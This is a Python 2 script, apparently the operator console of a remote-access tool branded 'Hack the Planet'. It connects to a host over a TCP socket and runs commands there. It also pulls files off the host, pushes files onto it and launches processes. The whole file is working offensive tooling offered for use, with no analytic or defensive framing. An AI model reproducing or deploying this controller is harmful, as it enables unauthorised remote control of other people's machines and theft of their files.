# -*- coding: utf-8 -*-
# Author : Hades.y2k
# HACK THE PLANET

import sys
import socket
import os

# the flag below is used to determine the end of
# transmitting data, socket will receive another incoming packet
# until it receives END_OF_STRING flag.
END_OF_STRING = "[XX]END OF STRING[XX]"
END_OF_FILE = "[XX]END OF DATA[XX]"


def banner():
    # you can remove banner at line number 43
    print("""╦ ╦╔═╗╔═╗╦╔═  ╔╦╗╦ ╦╔═╗  ╔═╗╦  ╔═╗╔╗╔╔═╗╔╦╗
╠═╣╠═╣║  ╠╩╗   ║ ╠═╣║╣   ╠═╝║  ╠═╣║║║║╣  ║
╩ ╩╩ ╩╚═╝╩ ╩   ╩ ╩ ╩╚═╝  ╩  ╩═╝╩ ╩╝╚╝╚═╝ ╩\n""")


def info():
    print("- type 'help' to view available commands\n")


def help():
    print("- to run command on remote host, put ':' in front of the commands")
    print("- without ':' will run on your computer")
    print("- :download to download files from remote host")
    print("- :upload to upload files to remote host")
    print("- :newProcess <PROGRAM> <args> to run specified program as a new process")
    print("- 'exit' to disconnect from remote host but you can reconnect again")
    print("")


def connectServer(ip, port):
    global session, remoteIP
    session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    remoteIP = ip

    try:
        session.connect((remoteIP, port))
        banner()
        print("Connected to remote host")
        info()
        prompt()
    except socket.error:
        print("Cannot connect to remote host")
        exit()


def prompt():
        command = raw_input("[%s] $ " % remoteIP)

        if command == "exit":
            session.send("Disconnect")
            session.close()
            exit()

        elif command == "help":
            help()

        elif command == "pwd":
            print(os.getcwd() + "\n")

        elif command[0:2] == 'cd':
            os.chdir(command[3:])
            print("moved to another directory\n")

        elif command.startswith(":"):
            # if command starts with ':',
            # it is a command to remote host

            if command[1:9] == "download":
                # transferring data from Server > Client

                # send command (ex: :download a.txt)
                # tell server that the file is coming
                session.send(command)

                # set file name
                fileName = command[10:]

                # Begin downloading
                while True:
                    l = session.recv(1024)

                    if l.startswith("File not found"):
                        printOnConsole(l)
                        break

                    f = open(fileName, 'w')
                    while (l):
                        if l.endswith(END_OF_FILE):
                            if END_OF_FILE in l:
                                # removing END_OF_FILE flag
                                l = l.replace(END_OF_FILE, "")
                            f.write(l)
                            break
                        else:
                            f.write(l)
                            l = session.recv(1024)

                    print("Download complete\n")
                    # closing file
                    f.close()
                    break

            elif command[1:7] == "upload":
                session.send(command)
                # set file name
                fileName = command[8:]

                try:
                    f = open(fileName, 'r')
                    l = f.read(1024)

                    while (l):
                        session.send(l)
                        l = f.read(1024)
                    f.close()
                    session.send(END_OF_FILE)
                    printOnConsole(session.recv(1024))

                except IOError:
                    print("File not found\n")

            else:
                session.send(command)
                # Print the command result
                result = session.recv(1024)

                while not result.endswith(END_OF_STRING):
                    result += session.recv(1024)

                printOnConsole(result)

        else:
            os.system(command)
            print("")  # giving new line in console

        prompt()


def printOnConsole(string):
    # Remove END_OF_STRING flag
    # if END_OF_STRING might included after receiving
    # multiplace packets accidentally
    if END_OF_STRING in string:
        string = string.replace(END_OF_STRING, '')
    print(string)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("python console.py ip port")
        exit()
    else:
        connectServer(sys.argv[1], int(sys.argv[2]))
